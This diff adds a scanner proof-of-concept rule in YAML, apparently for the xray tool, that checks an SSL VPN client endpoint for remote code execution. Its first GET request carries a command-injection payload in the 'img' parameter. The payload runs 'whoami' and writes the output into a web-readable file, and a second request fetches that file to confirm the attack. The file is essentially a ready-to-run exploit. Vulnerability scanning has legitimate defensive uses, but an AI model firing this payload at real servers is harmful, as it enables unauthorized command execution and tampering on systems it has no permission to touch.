@@ -1,0 +1,13 @@
+name: poc-yaml-sslvpn-client-rce
+rules:
+  - method: GET
+    path: "/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls"
+    Content-Type: application/x-www-form-urlencoded
+    expression: |
+      response.status == 200 && response.body.bcontains(b"x /tmp|echo `whoami` |tee /usr/local/webui/sslvpn/ceshi.txt|ls")
+  - method: GET
+    path: "/sslvpn/ceshi.txt"
+    expression: |
+      response.status == 200
+detail:
+  author: 666
